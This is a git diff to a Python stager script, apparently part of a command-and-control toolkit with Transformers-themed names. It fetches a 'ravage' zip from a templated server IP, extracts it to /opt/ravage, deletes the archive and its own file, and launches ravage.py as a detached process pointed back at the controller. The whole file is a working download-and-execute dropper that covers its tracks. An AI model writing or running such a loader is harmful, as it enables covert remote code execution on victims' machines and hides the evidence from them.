@@ -3,6 +3,7 @@ import string
 from urllib import request
 import os
 import subprocess
+from zipfile import ZipFile
 
 
 def get_random_string(length):
@@ -12,8 +13,8 @@ def get_random_string(length):
 
 
 WHEELIE_PATH = os.path.abspath(__file__)
-# RAVAGE_DIR = f'/tmp/{get_random_string(20)}'
-RAVAGE_DIR = os.path.realpath('/home/sam/Desktop/ravage-tmp')
+RAVAGE_ZIP_FILE = f'/opt/ravage/ravage.zip'
+RAVAGE_ROOT_DIR = f'/opt/ravage'
 SOUNDWAVE_IP = '<>SOUNDWAVE_IP</>'
 RAVAGE_IP = '<>RAVAGE_IP</>'
 WEB_SERVER_PORT = '<>WEB_SERVER_PORT</>'
@@ -23,12 +24,15 @@ COMMUNICATION_PORT = '<>COMMUNICATION_PORT</>'
 with request.urlopen(f'http://{SOUNDWAVE_IP}:{WEB_SERVER_PORT}/ravage') as res:
     data = res.read()
 
-os.makedirs(RAVAGE_DIR, exist_ok=True)
-with open(f'{RAVAGE_DIR}/ravage.zip', 'wb') as fh:
+os.makedirs(os.path.dirname(RAVAGE_ZIP_FILE), exist_ok=True)
+
+with open(RAVAGE_ZIP_FILE, 'wb') as fh:
     fh.write(data)
 
-os.system(f'unzip -o -q {RAVAGE_DIR}/ravage.zip -d {RAVAGE_DIR}/')
-os.system(f'rm -rf {WHEELIE_PATH}')
+with ZipFile(RAVAGE_ZIP_FILE) as zf:
+    zf.extractall(RAVAGE_ROOT_DIR)
 
-subprocess.Popen(['python3', f'{RAVAGE_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP, COMMUNICATION_PORT],
-                 cwd=RAVAGE_DIR, start_new_session=True)
+os.unlink(RAVAGE_ZIP_FILE)
+os.unlink(WHEELIE_PATH)
+
+subprocess.Popen(['python3', f'{RAVAGE_ROOT_DIR}/ravage.py', SOUNDWAVE_IP, RAVAGE_IP, COMMUNICATION_PORT], cwd=RAVAGE_ROOT_DIR, start_new_session=True)
